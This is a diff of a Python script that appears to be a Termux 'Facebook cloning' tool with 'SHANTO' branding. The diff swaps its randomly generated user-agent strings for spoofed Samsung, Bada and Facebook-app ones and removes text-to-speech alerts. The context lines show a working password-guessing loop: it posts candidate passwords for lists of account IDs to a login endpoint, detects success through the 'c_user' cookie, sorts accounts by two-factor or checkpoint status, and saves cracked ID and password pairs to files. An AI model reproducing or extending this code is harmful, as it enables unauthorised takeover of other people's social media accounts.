@@ -5,9 +5,6 @@
 #tottaly written by hamid Khawaja
 #!/usr/bin/python3
 #---------------------[IMPORT]---------------------#
-os.system("pkg install sox -y")
-os.system("play op.mp3")
-os.system("pkg install espeak")
 from bs4 import BeautifulSoup as sop
 from concurrent.futures import ThreadPoolExecutor as tred
 import os,sys,time,json,random,re,string,platform,base64,platform,uuid
@@ -156,18 +153,18 @@ ua_opera = []
 user=[]
 ugen=[]
 for xd in range(10000):
-    aa='Mozilla/5.0 (Linux; U; Android'
-    b=random.choice(['6','7','8','9','10','11','12'])
+    aa='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
+    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
     c=' en-us; GT-'
     d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
     e=random.randrange(1, 999)
     f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+    g='; U; Bada/1.2; en-us) AppleWebKit/537.36 (KHTML, like Gecko) Dolfin/'
     h=random.randrange(73,100)
     i='0'
     j=random.randrange(4200,4900)
     k=random.randrange(40,150)
-    l='Mobile Safari/537.36'
+    l='Mobile/18G82 [FBAN/FBIOS;FBAV/333.0.0.30.109;FBBV/313309308;FBDV/iPhone10,5;FBMD/iPhone;FBSN/iOS;FBSV/14.7.1;FBSS/3;FBID/phone;FBLC/pt_BR;FBOP/5;FBRV/315505842]'
     uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
     ugen.append(uaku2)
 def exit():
@@ -258,7 +255,7 @@ def main():
     print(f" {WHITE}TODAY DATE     :{RED} {ha}/{bu}/{ta} {ORANGE}~> {GREEN} "+str(xc)+":"+str(lt()[4])+" "+ tag+" ")
     print(f" {WHITE}USER NAME      : {BLUE}"+NameX)
     print(f"{BLUE}══════════════════════════════════════════════════════")
-    print(f"{RED}[01] {WHITE}RANDOM CLONE {RED}[Not Updated]")
+    print(f"{RED}[01] {WHITE}RANDOM CLONE {RED}[ Updated]")
     print(f"{RED}[02] {WHITE}FILE CLONING{GREEN} [   BEST    ]")
     print(f"{RED}[03] {WHITE}FILE CREATE  {GREEN}[NEW METHOD ] ")
     print(f"{RED}[04] {WHITE}FILE CREATE  {GREEN}[ UNLIMITED ]")
@@ -403,7 +400,7 @@ def method1(ids,names,passlist,total_ids):
             next = r.post(url2,data=data,headers=hed2,allow_redirects = False).text
             cookies = r.cookies.get_dict().keys()
             if 'c_user' in cookies:
-                os.system('espeak -a 300 "SHANTO, OK, ID')
+                ##os.system("play-audio SHANTO_OK.mp3")
                 print('\r\033[1;32m[SHANTO-OK] '+ids+' | '+pas+'\033[1;97m')
                 ok.append(ids)
                 open('/sdcard/SHANTO_OK.txt', 'a').write(ids+' | '+pas+'\n')
@@ -412,13 +409,13 @@ def method1(ids,names,passlist,total_ids):
                 d = re.search('<\W*title\W*(.*)</title',next,re.IGNORECASE)
                 #print(d.group(1))
                 if 'Enter login code to continue' in str(d):
-                    os.system('espeak -a 300 "SHANTO, 2F")
+                    ##os.system("play-audio SHANTO_2F.mp3")
                     print('\r\033[1;35m[SHANTO-2F] '+ids+' | '+pas+'\033[1;97m')
                     tf.append(ids)
                     open('/sdcard/SHANTO_2F.txt', 'a').write(ids+' | '+pas+'\n')
                     break
                 else:
-                    os.system('espeak -a 300 "SHANTO, CP")
+                    ##os.system("play-audio SHANTO_CP.mp3")
                     print('\r\033[1;31m[SHANTO-CP] '+ids+' | '+pas+'\033[1;97m')
                     cp.append(ids)
                     open('/sdcard/SHANTO_CP.txt', 'a').write(ids+' | '+pas+'\n')
